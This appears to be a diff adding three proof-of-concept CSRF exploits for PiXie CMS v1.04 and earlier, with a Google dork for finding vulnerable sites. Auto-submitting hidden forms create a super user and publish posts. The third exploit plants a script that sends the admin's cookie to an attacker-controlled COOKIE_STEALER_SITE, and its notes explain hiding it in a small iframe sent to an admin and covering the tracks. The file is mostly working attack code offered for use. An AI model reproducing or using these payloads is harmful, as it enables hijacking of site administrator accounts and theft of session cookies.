@@ -1,0 +1,175 @@
+Add Super User:
+<html>
+<!--
+# Exploit Title: PiXie CMS v1.04 <= CSRF Add Super User
+# Google Dork: allintext: "Pixie Powered"
+# Date: 28/12/2010
+# Author: Ali Raheem (AKA wolfmankurd)
+# Software Link: http://pixie-cms.googlecode.com/files/pixie_v1.04.zip
+# Version: <=1.04
+# Tested on: Linux sheevaplug-debian 2.6.32-00007-g56678ec #1 PREEMPT Mon Feb 8 03:49:55 PST 2010 armv5tel GNU/Linux
+Note	: Repace site and path,
+USERNAME no spaces,	
+REALNAME with a name,
+EMAIL with a valid email you get login details
+-->
+<head></head>
+<body onload='document.pwn.submit()'>
+<form accept-charset="UTF-8" action="http://SITEANDPATH/admin/?s=settings&x=users" method="post" class="form" name="pwn">
+<input type="hidden" name="uname" id="uname" value="USERNAME"/>
+<!-- No Spaces!-->
+<input type="hidden" name="realname" id="realname" value="REALNAME"/>
+<input type="hidden" name="email" id="email" value="EMAIL"/>
+<!-- needs to be Valid-->
+<input type="hidden" name="user_new" value="Save"/>
+<input type="hidden" name="privilege" value="2" />
+</form>
+</body>
+</html>
+
+Add Post:
+<html>
+<!--
+# Exploit Title: PiXie CMS v1.04 <= CSRF Add Post
+# Google Dork: allintext: "Pixie Powered"
+# Date: 28/12/2010
+# Author: Ali Raheem (AKA wolfmankurd)
+# Software Link: http://pixie-cms.googlecode.com/files/pixie_v1.04.zip
+# Version: <=1.04
+# Tested on: Linux sheevaplug-debian 2.6.32-00007-g56678ec #1 PREEMPT Mon Feb 8 03:49:55 PST 2010 armv5tel GNU/Linux
+# Note: Replace SITE_AND_PATH
+Have a look at the form and set title, content, tags and Author to whatever you want.
+-->
+<head></head>
+<body onload='document.pwn.submit()'>
+<form accept-charset="UTF-8" action="http://SITE_AND_PATH/admin/?s=publish&m=dynamic&x=blog&page=1" method="post" name="pwn" id="form_addedit" class="form">
+<input type="hidden"name="table_name" value="pixie_dynamic_posts"/>
+<input type="hidden" class="form_text" name="post_id" value="" maxlength="11" />
+<input type="hidden" class="form_text" name="page_id" value="3" maxlength="11" />
+<input type="hidden" id="date" name="day" value="28">
+<input type="hidden" name="month" value="12">
+<input type="hidden" name="year" value="2010">
+<input type="hidden" class="form_text" name="time" value="16:06" size="5" maxlength="5" />
+<input type="hidden" class="form_text" name="title" id="title" value="PwnT" />
+<input type="hidden" name="content" id="content" cols="50" value="PwnT by CSRF">
+<input type="hidden" class="form_text" name="tags" id="tags" value="Hack"/>
+<input type="hidden" name="public" id="public" value="yes" />
+<input type="hidden" type="radio" name="comments" id="comments" value="yes" />
+<input type="hidden" class="form_text" name="author" value="AUTHOR" maxlength="64" />
+<input type="hidden" class="form_text" name="last_modified" value="20101228160628" />
+<input type="hidden" class="form_text" name="post_views" value="" maxlength="99" />
+<input type="hidden" class="form_text" name="post_slug" value="" maxlength="255" />
+<input type="hidden" name="submit_new" class="submit" value="Save" type="submit"/>
+</form>
+</body>
+</html>
+
+# Exploit Title: PiXie CMS v1.04 CSRF to hidden cookie steal
+Needs to be modified for clean URLS.
+
+
+
+Place this on your server and replace SITE_AND_PATH with the location of the Pixie CMS.
+
+Then point COOKIE_STEALER_SITE at a cookie stealer I've called it log.php and it GETs then logs the data variable. (https://github.com/Spyware/The-Toolkit/blob/master/recon/multi/cookie-stealer/log.php works) along with a writable log file called log.
+
+
+
+Now include this in a secret (make it small and hidden) iframe in a link and send it to an Admin.
+
+
+
+How this works, the little iframe first causes the admin to secretly post a new blog article (dated in the year 2000 so it wont be on the front page, maybe even make it non-public). Then redirects him to it. This article steals his cookie. We can do this because of predictable permalinks.
+
+
+
+All this happens in seconds in a possibly hidden iframe. The only evidence? It will be in his latest actions log and the blog post (which will hopefully be hidden deep in the archives).
+
+
+
+-->
+
+<body
+
+onload='document.pwn.submit();location="http://SITE_AND_PATH/?s=blog&m=permalink&x=__stealer"'>
+
+<form accept-charset="UTF-8"
+
+action="http://SITE_AND_PATH/admin/?s=publish&m=dynamic&x=blog&page=1"
+
+method="post" name="pwn" id="form_addedit" class="form">
+
+<input type="hidden"name="table_name" value="pixie_dynamic_posts"/>
+
+<input type="hidden" class="form_text" name="post_id" value=""
+
+maxlength="11" />
+
+<input type="hidden" class="form_text" name="page_id" value="3"
+
+maxlength="11" />
+
+<input type="hidden" id="date" name="day" value="10">
+
+<input type="hidden" name="month" value="12">
+
+<input type="hidden" name="year" value="2000">
+
+<input type="hidden" class="form_text" name="time" value="16:06"
+
+size="5" maxlength="5" />
+
+<input type="hidden" class="form_text" name="title" id="title"
+
+value="__stealer" />
+
+<input type="hidden" name="content" id="content" cols="50"
+
+value="<img src='' name='stealer'>
+
+<script>
+
+document.stealer.src='COOKIE_STEALER_SITE/log.php?data='+document.cookie;
+
+</script>
+
+">
+
+<input type="hidden" class="form_text" name="tags" id="tags"
+
+value="Hack"/>
+
+<input type="hidden" name="public" id="public" value="yes" />
+
+<input type="hidden" type="radio" name="comments" id="comments"
+
+value="yes" />
+
+<input type="hidden" class="form_text" name="author" value="AUTHOR"
+
+maxlength="64" />
+
+<input type="hidden" class="form_text" name="last_modified"
+
+value="20101228160628" />
+
+<input type="hidden" class="form_text" name="post_views" value=""
+
+maxlength="99" />
+
+<input type="hidden" class="form_text" name="post_slug" value=""
+
+maxlength="255" />
+
+<input type="hidden" name="submit_new" class="submit" value="Save"
+
+type="submit"/>
+
+</form>
+
+</body>
+
+</html>
+
+
+
